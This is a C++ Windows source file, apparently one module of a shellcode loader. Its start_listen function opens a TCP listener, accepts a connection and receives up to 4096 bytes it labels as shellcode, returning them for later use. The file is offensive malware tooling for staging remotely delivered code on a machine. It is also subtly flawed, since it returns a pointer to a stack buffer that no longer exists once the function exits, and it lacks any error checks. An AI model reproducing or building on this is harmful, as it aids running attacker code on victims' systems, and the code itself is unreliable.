#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include "listener.h"
#pragma comment(lib, "ws2_32.lib")

struct recv_shell start_listen(PCSTR port)
{
    recv_shell s;
    LPWSADATA wsaData = new WSAData();
    ADDRINFOA* socketHint = new ADDRINFOA();
    ADDRINFOA* addressInfo = new ADDRINFOA();
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    CHAR bufferReceivedBytes[4096] = { 0 };
    INT receivedBytes = 0;

    socketHint->ai_family = AF_INET;
    socketHint->ai_socktype = SOCK_STREAM;
    socketHint->ai_protocol = IPPROTO_TCP;
    socketHint->ai_flags = AI_PASSIVE;

    WSAStartup(MAKEWORD(2, 2), wsaData);
    GetAddrInfoA(NULL, port, socketHint, &addressInfo);

    listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
    bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
    listen(listenSocket, SOMAXCONN);
    printf("[*] Listening on TCP port %s\n", port);

    clientSocket = accept(listenSocket, NULL, NULL);
    printf("[+] Incoming connection...\n");

    receivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), NULL);
    if (receivedBytes > 0) {
        printf("[+] Received shellcode bytes %d\n", receivedBytes);
    }

    s.bufferReceivedBytes = bufferReceivedBytes;
    s.receivedBytes = receivedBytes;
    return s;
}